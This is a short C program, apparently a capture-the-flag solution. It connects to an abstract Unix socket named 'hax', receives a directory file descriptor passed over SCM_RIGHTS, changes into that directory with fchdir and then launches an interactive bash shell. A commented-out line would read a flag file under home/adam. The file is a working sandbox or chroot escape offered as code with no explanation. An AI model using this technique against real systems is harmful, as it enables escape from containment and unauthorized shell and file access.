#include <sys/socket.h>
#include <sys/types.h>
#include <sys/un.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int recv_fd(int socket)
{
    // from http://blog.varunajayasiri.com/passing-file-descriptors-between-processes-using-sendmsg-and-recvmsg
    struct msghdr message;
    struct iovec iov[1];
    struct cmsghdr *control_message = NULL;
    char ctrl_buf[CMSG_SPACE(sizeof(int))];
    char data[1];
    int res;

    memset(&message, 0, sizeof(struct msghdr));
    memset(ctrl_buf, 0, CMSG_SPACE(sizeof(int)));

    /* For the dummy data */
    iov[0].iov_base = data;
    iov[0].iov_len = sizeof(data);

    message.msg_name = NULL;
    message.msg_namelen = 0;
    message.msg_control = ctrl_buf;
    message.msg_controllen = CMSG_SPACE(sizeof(int));
    message.msg_iov = iov;
    message.msg_iovlen = 1;

    if ((res = recvmsg(socket, &message, 0)) <= 0)
        return res;

    /* Iterate through header to find if there is a file descriptor */
    for (control_message = CMSG_FIRSTHDR(&message); control_message != NULL; control_message = CMSG_NXTHDR(&message, control_message)) {
        if ((control_message->cmsg_level == SOL_SOCKET) && (control_message->cmsg_type == SCM_RIGHTS)) {
            return *((int *) CMSG_DATA(control_message));
        }
    }

    return -1;
}

int main()
{
    int socket_fd;
    struct sockaddr_un server_address;

    if ((socket_fd = socket(AF_UNIX, SOCK_STREAM, 0)) < 0) {
        perror("socket()");
        return -1;
    }

    memset(&server_address, 0, sizeof(server_address));
    server_address.sun_family = AF_UNIX;
    strcpy(server_address.sun_path, "#hax");
    server_address.sun_path[0] = 0;

    if (connect(socket_fd, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
        perror("connect()");
        return -1;
    }

    int dirfd = recv_fd(socket_fd);
    fchdir(dirfd);

    //system("cat home/adam/flag");

    execl("/bin/bash", "/bin/bash", "-i", (char*)0);

    perror("execl()");
    return -1;
}

